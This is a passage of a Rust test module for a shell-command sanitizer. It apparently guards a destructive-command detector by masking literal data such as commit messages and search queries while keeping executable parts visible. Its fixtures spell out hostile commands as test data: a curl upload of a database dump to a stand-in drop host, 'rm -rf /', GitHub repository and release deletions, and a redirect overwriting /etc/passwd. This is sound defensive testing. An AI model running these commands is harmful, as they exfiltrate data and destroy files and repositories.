        assert_eq!(data_span.unwrap().kind, SpanKind::Argument);
    }

    #[test]
    fn sanitize_preserves_curl_file_body_evidence() {
        for command in [
            r"curl -d @C:\dump.sql https://drop.example.com/u",
            r"curl --data=@C:\dump.sql https://drop.example.com/u",
            r"curl --data-binary @- https://drop.example.com/u",
            r#"curl --data-urlencode "@C:\dump.sql" https://drop.example.com/u"#,
        ] {
            let sanitized = sanitize_for_pattern_matching(command);
            assert!(
                sanitized.contains('@'),
                "curl @file/stdin evidence must remain visible: {sanitized:?}"
            );
        }

        let literal =
            sanitize_for_pattern_matching(r#"curl -d "rm -rf /" https://api.example.com"#);
        assert!(
            !literal.contains("rm -rf"),
            "literal curl request data should still be masked"
        );
    }

    #[test]
    fn test_false_positive_ag_pattern() {
        // ag -e with destructive-looking pattern should NOT trigger
        let cmd = r#"ag -e "rm -rf" src/"#;

        // Using the registry
        assert!(SAFE_STRING_REGISTRY.is_flag_data("ag", "-e"));

        // The pattern should be classified as Argument
        let spans = classify_command(cmd);
        let pattern_span = spans.spans().iter().find(|s| s.text(cmd) == "\"rm -rf\"");
        assert!(pattern_span.is_some());
        assert_eq!(pattern_span.unwrap().kind, SpanKind::Argument);
    }

    #[test]
    fn test_false_positive_docker_label() {
        // docker --label with destructive-looking label should NOT trigger
        let cmd = r#"docker run --label "cleanup=rm -rf /tmp" nginx"#;

        // Using the registry
        assert!(SAFE_STRING_REGISTRY.is_flag_data("docker", "--label"));

        // The label should be classified as Argument
        let spans = classify_command(cmd);
        let label_span = spans
            .spans()
            .iter()
            .find(|s| s.text(cmd).contains("rm -rf"));
        assert!(label_span.is_some());
        assert_eq!(label_span.unwrap().kind, SpanKind::Argument);
    }

    #[test]
    fn shell_redirect_operator_recognises_all_common_forms() {
        // Untyped output redirects.
        for op in [">", ">>", ">|", "&>", "&>>", ">&"] {
            assert!(
                super::is_shell_redirect_operator(op),
                "expected `{op}` to be a recognised redirect operator"
            );
        }
        // Read-write and FD-to-FD untyped.
        for op in ["<>", "<&"] {
            assert!(
                super::is_shell_redirect_operator(op),
                "expected `{op}` to be a recognised redirect operator"
            );
        }
        // Numbered FDs (0-9) for output / FD-to-FD / read-write.
        for digit in b'0'..=b'9' {
            for suffix in [">", ">>", ">|", ">&", "<>", "<&"] {
                let op = format!("{}{}", digit as char, suffix);
                assert!(
                    super::is_shell_redirect_operator(&op),
                    "expected `{op}` (FD-{}) to be a recognised redirect operator",
                    digit as char
                );
            }
        }
        // Multi-digit and named FDs redirect exactly like single-digit ones,
        // and `redirect-truncate-root-home` already models both prefixes.
        for op in [
            "10>", "10>>", "10>|", "10>&", "255>", "{fd}>", "{fd}>|", "{fd}>>", "{v}>&", "{v}<>",
        ] {
            assert!(
                super::is_shell_redirect_operator(op),
                "expected `{op}` to be a recognised redirect operator"
            );
        }
    }

    #[test]
    fn shell_redirect_operator_rejects_non_redirects() {
        // Non-redirect tokens that share a byte with redirect operators
        // must NOT be classified as redirects, otherwise the sanitize
        // path would incorrectly drop out of args-data mode on benign
        // tokens like `>file` (combined operator+target — different
        // shape, different handling).
        for non_op in [
            "",
            ">file",
            ">>file",
            "1>file",
            "echo",
            "/etc/passwd",
            ">/etc",
            "<", // input-only, intentionally NOT in the list
            "<<",
            "<<<",    // here-doc / here-string
            ">>>",    // not valid bash
            "10file", // digits without an operator
            "{fd}",   // FD allocation without an operator
            "{}>",    // empty FD name
            "{1fd}>", // FD name may not start with a digit
            "{fd>",   // unterminated FD allocation
            "&",
            "|",
            ";",
        ] {
            assert!(
                !super::is_shell_redirect_operator(non_op),
                "did not expect `{non_op}` to be classified as a redirect operator"
            );
        }
    }

    // =========================================================================
    // Issue #380: `gh search` queries and `-S/--search` values are data
    // =========================================================================

    #[test]
    fn sanitize_masks_gh_search_query_positionals() {
        for cmd in [
            "gh search issues 'gh release delete' --repo owner/project",
            "gh search issues \"gh release delete\" --repo owner/project",
            "gh search prs gh release delete --state open",
            "gh search code 'gh repo delete' --owner acme",
            "gh search commits \"release delete\" --repo owner/project",
            "gh search repos release delete",
            "/usr/local/bin/gh search issues 'gh release delete'",
            "sudo gh search issues 'gh release delete'",
        ] {
            let sanitized = sanitize_for_pattern_matching(cmd);
            assert!(
                matches!(sanitized, std::borrow::Cow::Owned(_)),
                "search query was not masked at all: {cmd} -> {sanitized}"
            );
            assert!(
                !sanitized.as_ref().contains("delete"),
                "search query leaked: {cmd} -> {sanitized}"
            );
            assert!(
                sanitized.as_ref().contains("gh search"),
                "executable part must stay visible: {cmd} -> {sanitized}"
            );
            assert_eq!(sanitized.len(), cmd.len(), "masking must preserve length");
        }
    }

    #[test]
    fn sanitize_masks_gh_list_search_flag_values() {
        for cmd in [
            "gh issue list --search 'gh release delete'",
            "gh issue list -S \"release delete\" --state all",
            "gh pr list --search='gh release delete' --repo owner/project",
        ] {
            let sanitized = sanitize_for_pattern_matching(cmd);
            assert!(
                !sanitized.as_ref().contains("delete"),
                "search flag value leaked: {cmd} -> {sanitized}"
            );
            assert!(
                sanitized.as_ref().contains("list"),
                "executable part must stay visible: {cmd} -> {sanitized}"
            );
        }
    }

    #[test]
    fn sanitize_gh_search_keeps_executable_constructs_visible() {
        // Inline code inside the query is still shell-executed.
        let cmd = "gh search issues \"$(gh release delete v1 --yes)\"";
        let sanitized = sanitize_for_pattern_matching(cmd);
        assert!(
            sanitized.as_ref().contains("gh release delete v1 --yes"),
            "command substitution inside a search query must stay visible: {sanitized}"
        );

        // A redirect target is the shell's, not gh's.
        let cmd = "gh search issues foo > /etc/passwd";
        let sanitized = sanitize_for_pattern_matching(cmd);
        assert!(
            sanitized.as_ref().contains("> /etc/passwd"),
            "redirect target must stay visible: {sanitized}"
        );

        // Masking ends at the segment boundary.
        let cmd = "gh search issues 'release delete' && gh release delete v1 --yes";
        let sanitized = sanitize_for_pattern_matching(cmd);
        assert!(
            sanitized.as_ref().contains("&& gh release delete v1 --yes"),
            "the next segment must stay visible: {sanitized}"
        );
        assert!(
            !sanitized.as_ref().contains("'release delete'"),
            "the query in the first segment must still be masked: {sanitized}"
        );
    }

    #[test]
    fn sanitize_gh_non_search_subcommands_keep_positionals_visible() {
        // Only `search` switches to all-args-data; a real deletion's argv is
        // untouched so the platform.github rules still see it.
        for cmd in [
            "gh release delete v1 --yes --cleanup-tag",
            "gh release delete-asset v1 file.tgz -y",
            "gh repo delete acme/widgets --yes",
            "gh -R acme/widgets release delete v1",
        ] {
            let sanitized = sanitize_for_pattern_matching(cmd);
            assert_eq!(
                sanitized.as_ref(),
                cmd,
                "non-search gh argv must not be masked"
            );
        }
    }

    #[test]
    fn test_registry_gh_search_flags() {
        assert!(SAFE_STRING_REGISTRY.is_flag_data("gh", "-S"));
        assert!(SAFE_STRING_REGISTRY.is_flag_data("gh", "--search"));
        assert!(!SAFE_STRING_REGISTRY.is_flag_data_multivalue("gh", "--search"));
    }

    // =========================================================================
    // Issue #257: execution wrappers must not defeat data-argument masking
    // =========================================================================

    #[test]
    fn sanitize_masks_commit_message_behind_execution_wrappers() {
        // Without wrapper tracking, the launcher word occupied the segment
        // command slot, `git commit -m` was never recognized, and the word
        // "restore" inside the message stayed visible to the raw
        // `git ... restore` regexes (#257).
        for wrapper in [
            "mise exec --",
            "nice",
            "nice -n 10",
            "time",
            "nohup",
            "stdbuf -oL",
            "timeout 30",
            "setsid",
            "ionice -c 2 -n 0",
            "chrt 50",
        ] {
            let cmd = format!("{wrapper} git commit -m \"prove PostgreSQL restore round trip\"");
            let sanitized = sanitize_for_pattern_matching(&cmd);
            assert!(
                matches!(sanitized, std::borrow::Cow::Owned(_)),
                "wrapped commit message was not masked at all: {cmd} -> {sanitized}"
            );
            assert!(
                !sanitized.as_ref().contains("restore"),
                "commit message leaked through wrapper `{wrapper}`: {cmd} -> {sanitized}"
            );
            assert!(
                sanitized.as_ref().contains("git commit -m"),
                "executable part must stay visible: {cmd} -> {sanitized}"
            );
        }
    }

    #[test]
    fn sanitize_keeps_executable_payloads_behind_wrappers_visible() {
        // Wrappers only re-point the segment command at the wrapped argv;
        // genuinely executable payloads must never be masked.
        for cmd in [
            "nice git reset --hard",
            "timeout 30 git reset --hard HEAD~1",
            "mise exec -- git reset --hard",
        ] {
            let sanitized = sanitize_for_pattern_matching(cmd);
            assert!(
                sanitized.as_ref().contains("reset --hard"),
                "destructive payload behind a wrapper was masked: {cmd} -> {sanitized}"
            );
        }
    }

    #[test]
    fn sanitize_does_not_treat_other_mise_subcommands_as_wrappers() {
        // Only `mise exec` / `mise x` run a wrapped command; other mise
        // subcommands must not re-point the segment command (which could mask
        // their arguments against unrelated safe-flag registries).
        let cmd = "mise install git && git commit -m \"prove PostgreSQL restore round trip\"";
        let sanitized = sanitize_for_pattern_matching(cmd);
        assert!(
            !sanitized.as_ref().contains("restore"),
            "direct git commit message after `&&` must still be masked: {cmd} -> {sanitized}"
        );
        assert!(
            sanitized.as_ref().contains("mise install git"),
            "mise install argv must stay visible: {cmd} -> {sanitized}"
        );
    }
}
